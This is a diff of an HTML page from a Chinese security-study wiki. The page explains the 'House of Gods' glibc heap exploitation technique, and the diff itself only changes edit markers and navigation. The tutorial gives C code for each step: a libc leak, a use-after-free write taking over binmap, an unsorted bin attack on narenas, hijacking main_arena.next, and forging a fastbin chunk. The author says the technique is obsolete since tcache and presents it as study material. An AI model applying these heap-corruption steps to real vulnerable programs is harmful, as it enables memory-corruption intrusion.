@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../../" aria-busy="true">
   <a href="../../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../../"
          data-navigation-hidden="false">
       
@@ -778,15 +778,45 @@
   
 
 
+<!-- blog-edit-start:981ba16d505f010c:b0 -->
+
 <h1 id="house-of-gods">house of gods</h1>
+<!-- blog-edit-end:981ba16d505f010c:b0 -->
+
 <div class="file-actions" data-image-edit-revision="c8bd9f95d4cdbf078b277395df50176085766fceeff9d5ad0fe83234b9f9208f" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C03.heap%5C08.misc%5C03.house_of_gods.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C03.heap%5C08.misc" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\wiki\03.heap\08.misc\03.house_of_gods.md">复制路径</span></div>
 
+<!-- blog-edit-start:981ba16d505f010c:b1 -->
+
 <p>相当有趣和综合的攻击方式。虽然 tcache 出来之后，这个攻击已经百分百不可能成功了，但是确实有趣和综合。</p>
+<!-- blog-edit-end:981ba16d505f010c:b1 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b2 -->
+
 <p>对 <code>malloc_state</code> 需要有非常好的理解才可以。下面就直接说攻击步骤，因为很难总结它的核心原理，用到了很多方面知识。</p>
+<!-- blog-edit-end:981ba16d505f010c:b2 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b3 -->
+
 <h2 id="binmap">控制 <code>binmap</code></h2>
+<!-- blog-edit-end:981ba16d505f010c:b3 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b4 -->
+
 <p>如下图所示，这是一个相当好的图，我们现在尝试控制 <code>malloc_state</code> 的 <code>binmap</code> 结构：</p>
+<!-- blog-edit-end:981ba16d505f010c:b4 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b5 -->
+
 <p><img alt="" src="../../../../../../asset/image/9ccb66bd6ffad4cf13888b6d2aca3c01/20260201074623.png" /></p>
+<!-- blog-edit-end:981ba16d505f010c:b5 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b6 -->
+
 <h3 id="libc">泄露 libc 地址</h3>
+<!-- blog-edit-end:981ba16d505f010c:b6 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b7 -->
+
 <p>首先是很常见的利用 unsorted 泄露 libc 地址，如下所示，此时 <code>leak</code> 是 <code>main_arena</code> 的 unsorted 地址：<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">SMALLCHUNK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">);</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos="2 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">FAST20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
@@ -794,14 +824,42 @@
 </span><span id="__span-0-4"><span class="linenos" data-linenos="4 "></span><span class="n">free</span><span class="p">(</span><span class="n">SMALLCHUNK</span><span class="p">);</span><span class="w"> </span><span class="c1">// 进入 unsorted 中</span>
 </span><span id="__span-0-5"><span class="linenos" data-linenos="5 "></span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">leak</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">SMALLCHUNK</span><span class="p">);</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:981ba16d505f010c:b7 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b8 -->
+
 <h3 id="binmap_1">准备控制 binmap</h3>
+<!-- blog-edit-end:981ba16d505f010c:b8 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b9 -->
+
 <p>其实控制 binmap 相当简单，因为我们知道 libc 地址（更确切的说，是 <code>main_arena</code> 的 unsorted 地址），那么就可以算出 binmap 在哪里了：</p>
+<!-- blog-edit-end:981ba16d505f010c:b9 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b10 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="c1">// Use After Free</span>
 </span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">SMALLCHUNK</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x8</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">leak</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x7f8</span><span class="p">;</span>
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b10 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b11 -->
+
 <p>此时我们来看看 unsorted 的链表情况，我们只看 <code>bk</code> 指针。第一个肯定是 <code>SMALLCHUNK</code>，这个没啥好说的。</p>
+<!-- blog-edit-end:981ba16d505f010c:b11 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b12 -->
+
 <p>第二个就是 <code>leak+0x7f8</code>，这个地址是 <code>binmap-0x8</code>，之所以是要偏移 <code>-0x8</code>，可以看下面第三块中找到答案：</p>
+<!-- blog-edit-end:981ba16d505f010c:b12 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b13 -->
+
 <p><img alt="" src="../../../../../../asset/image/9ccb66bd6ffad4cf13888b6d2aca3c01/20260201083000.png" /></p>
+<!-- blog-edit-end:981ba16d505f010c:b13 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b14 -->
+
 <p>第三个是 <code>binmap-0x8+0x18=binmap+0x10</code>，这个地址是哪里？查看 <code>malloc_state</code> 结构，可以看到是 <code>next</code> 指针：<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos="1 "></span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_state</span>
 </span><span id="__span-2-2"><span class="linenos" data-linenos="2 "></span><span class="p">{</span>
@@ -813,30 +871,106 @@
 </span><span id="__span-2-8"><span class="linenos" data-linenos="8 "></span><span class="w">  </span><span class="c1">// ...</span>
 </span><span id="__span-2-9"><span class="linenos" data-linenos="9 "></span><span class="p">}</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:981ba16d505f010c:b14 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b15 -->
+
 <p>而当我们只有一个 <code>main_arena</code> 的时候，<code>next</code> 指针就指向 <code>main_arena</code>，其内容如下：</p>
+<!-- blog-edit-end:981ba16d505f010c:b15 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b16 -->
+
 <p><img alt="" src="../../../../../../asset/image/9ccb66bd6ffad4cf13888b6d2aca3c01/20260201083732.png" /></p>
+<!-- blog-edit-end:981ba16d505f010c:b16 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b17 -->
+
 <p>此时的 unsorted 内容：</p>
+<!-- blog-edit-end:981ba16d505f010c:b17 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b18 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos="1 "></span>SMALLCHUNK --&gt; binmap-0x8 --&gt; main_arena
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b18 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b19 -->
+
 <h3 id="_1">实现控制</h3>
+<!-- blog-edit-end:981ba16d505f010c:b19 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b20 -->
+
 <p>从上面的图看到，<code>binmap[0]</code> 此时是 <code>0x200</code>，即上面分析的第二个块的 <code>size</code> 是 <code>0x200</code>，所以如下就能获取到 <code>binmap</code>：<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">BINMAP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">);</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:981ba16d505f010c:b20 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b21 -->
+
 <p>此时的 unsorted 内容：</p>
+<!-- blog-edit-end:981ba16d505f010c:b21 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b22 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos="1 "></span>main_arena
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b22 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b23 -->
+
 <h2 id="binmap_2">利用 binmap 攻击</h2>
+<!-- blog-edit-end:981ba16d505f010c:b23 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b24 -->
+
 <p>控制完 binmap 之后，其实相当于控制了 <code>malloc_state</code> 的某些数据结构，下面进行攻击的步骤说明。</p>
+<!-- blog-edit-end:981ba16d505f010c:b24 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b25 -->
+
 <h3 id="unsorted-bin-attack-narenas">利用 unsorted bin attack 修改 narenas</h3>
+<!-- blog-edit-end:981ba16d505f010c:b25 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b26 -->
+
 <p>malloc 使用 <code>narenas</code> 变量来记录当前 arena 的数量。如果这个计数器超过了限制（narenas_limit），malloc 就会开始 从 arena 链表中复用已有 arena，而不是创建新的 arena。</p>
+<!-- blog-edit-end:981ba16d505f010c:b26 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b27 -->
+
 <p>我们希望是要复用 arena 链表（后面会看到），所以这里可以通过一次 unsorted bin attack 将其设置为一个非常大的值。</p>
+<!-- blog-edit-end:981ba16d505f010c:b27 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b28 -->
+
 <p>这里提一下是如何做的。在上面一节提到的 unsorted 链表，其 <code>bk</code> 链条是：<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span>SMALLCHUNK --&gt; binmap-0x8 --&gt; main_arena
 </span></code></pre></div></p>
+<!-- blog-edit-end:981ba16d505f010c:b28 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b29 -->
+
 <p>我们可以再释放一个 <code>0x40</code> 大小的块到 fastbin 中，我们看文章最开始的图：<code>main_arena</code> 的开始就是 <code>malloc_state</code> 结构，而 <code>malloc_state</code> 结构的开始就是 <code>fastbin</code> 链表。如果释放到 0x40 的 fastbin 链表，它的位置相当于这个块的 <code>bk</code> 指针：</p>
+<!-- blog-edit-end:981ba16d505f010c:b29 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b30 -->
+
 <p><img alt="" src="../../../../../../asset/image/9ccb66bd6ffad4cf13888b6d2aca3c01/20260201090431.png" /></p>
+<!-- blog-edit-end:981ba16d505f010c:b30 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b31 -->
+
 <p>上面我们还释放了一个 0x20 大小（数据区大小）的块，为了防止 <code>size</code> 段是 0，造成报错。</p>
+<!-- blog-edit-end:981ba16d505f010c:b31 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b32 -->
+
 <p>剩下的就是利用这个 0x40 大小的块进行 unsorted bin attack 就行，这里直接给代码： </p>
+<!-- blog-edit-end:981ba16d505f010c:b32 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b33 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">SMALLCHUNK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">);</span>
 </span><span id="__span-7-2"><span class="linenos" data-linenos=" 2 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">FAST20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
 </span><span id="__span-7-3"><span class="linenos" data-linenos=" 3 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">FAST40</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">);</span>
@@ -861,21 +995,69 @@
 </span><span id="__span-7-22"><span class="linenos" data-linenos="22 "></span><span class="c1">// 执行 unsorted bin attack，malloc 之后会让 narenas 变为很大数字</span>
 </span><span id="__span-7-23"><span class="linenos" data-linenos="23 "></span><span class="n">INTM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x98</span><span class="p">);</span>
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b33 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b34 -->
+
 <h3 id="mainarenanext">修改 mainarena.next</h3>
+<!-- blog-edit-end:981ba16d505f010c:b34 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b35 -->
+
 <p>我们后续会用到 <code>mainarena.next</code>，这里进行修改，修改方式很简单，我们都有了 <code>BINMAP</code> 能控制 binmap 后面的内容，那么直接写即可：</p>
+<!-- blog-edit-end:981ba16d505f010c:b35 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b36 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-8-1"><span class="linenos" data-linenos="1 "></span><span class="c1">// 修改为我们可以控制的块</span>
 </span><span id="__span-8-2"><span class="linenos" data-linenos="2 "></span><span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">BINMAP</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x8</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">INTM</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x10</span><span class="p">);</span>
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b36 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b37 -->
+
 <h3 id="_2">执行两次大内存申请</h3>
+<!-- blog-edit-end:981ba16d505f010c:b37 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b38 -->
+
 <p>下面我们执行两次大内存申请：</p>
+<!-- blog-edit-end:981ba16d505f010c:b38 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b39 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-9-1"><span class="linenos" data-linenos="1 "></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xffffffffffffffbf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
 </span><span id="__span-9-2"><span class="linenos" data-linenos="2 "></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xffffffffffffffbf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b39 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b40 -->
+
 <p>第一次中，由于当前 arena 无法处理之前的内存分配请求，所以触发了 <code>reused_arena()</code> 函数，他会遍历 arena 链表，返回可用的 arena。由于从当前开始，所以这一次就返回给了我们 <code>main_arena</code>。</p>
+<!-- blog-edit-end:981ba16d505f010c:b40 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b41 -->
+
 <p>第二次中，依旧触发了 <code>reused_arena()</code> 函数，继续遍历 arena 链表，即返回了 <code>main_arena.next</code>。</p>
+<!-- blog-edit-end:981ba16d505f010c:b41 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b42 -->
+
 <p>所以现在是 <code>INTM</code> 这个可控制块变成了当前的 <code>malloc_state</code>，即系统认为它里面的内容是用于管理 fastbin 等等数据结构。</p>
+<!-- blog-edit-end:981ba16d505f010c:b42 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b43 -->
+
 <h3 id="_3">执行攻击</h3>
+<!-- blog-edit-end:981ba16d505f010c:b43 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b44 -->
+
 <p>所以我们只要修改 <code>INTM</code> 里面的内容，比如修改对应的 fastbin 链表内容，那么就可以了：</p>
+<!-- blog-edit-end:981ba16d505f010c:b44 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b45 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-10-1"><span class="linenos" data-linenos="1 "></span><span class="c1">// fakechunk，size 是自行构造的，是 0x70</span>
 </span><span id="__span-10-2"><span class="linenos" data-linenos="2 "></span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fakechunk</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-10-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="mh">0x0000000000000000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0000000000000073</span><span class="p">,</span>
@@ -885,6 +1067,10 @@
 </span><span id="__span-10-7"><span class="linenos" data-linenos="7 "></span><span class="c1">// 系统认为 INTM 管理 fastbin 等数据结构，我们把 0x70 对应大小的位置设置为 fakechunk</span>
 </span><span id="__span-10-8"><span class="linenos" data-linenos="8 "></span><span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">INTM</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">fakechunk</span><span class="p">);</span>
 </span></code></pre></div>
+<!-- blog-edit-end:981ba16d505f010c:b45 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b46 -->
+
 <p>此时申请一个块，成功：<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-11-1"><span class="linenos" data-linenos="1 "></span><span class="c1">// 此时会得到我们上面的 fakechunk</span>
 </span><span id="__span-11-2"><span class="linenos" data-linenos="2 "></span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">FAKECHUNK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">);</span>
@@ -892,9 +1078,24 @@
 </span><span id="__span-11-4"><span class="linenos" data-linenos="4 "></span><span class="c1">// 可以随便修改</span>
 </span><span id="__span-11-5"><span class="linenos" data-linenos="5 "></span><span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">FAKECHUNK</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4242424242424242</span><span class="p">;</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:981ba16d505f010c:b46 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b47 -->
+
 <h2 id="_4">总结</h2>
+<!-- blog-edit-end:981ba16d505f010c:b47 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b48 -->
+
 <p>相当相当漂亮的攻击，虽然现在不可以用了，但学习这种攻击确实有趣极了。</p>
+<!-- blog-edit-end:981ba16d505f010c:b48 -->
+
+<!-- blog-edit-start:981ba16d505f010c:b49 -->
+
 <p>参考文档：网上找了很长时间，没有好的资料，只有 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.24/house_of_gods.c">how2heap 对应的 PoC</a>，对着这个代码进行看了。</p>
+<!-- blog-edit-end:981ba16d505f010c:b49 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\wiki\03.heap\08.misc\03.house_of_gods.md" data-text-edit-revision="c8bd9f95d4cdbf078b277395df50176085766fceeff9d5ad0fe83234b9f9208f" data-text-edit-marker="981ba16d505f010c" data-text-edit-schema="1"></div>
 
 
 
@@ -1126,8 +1327,6 @@
         <script src="../../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
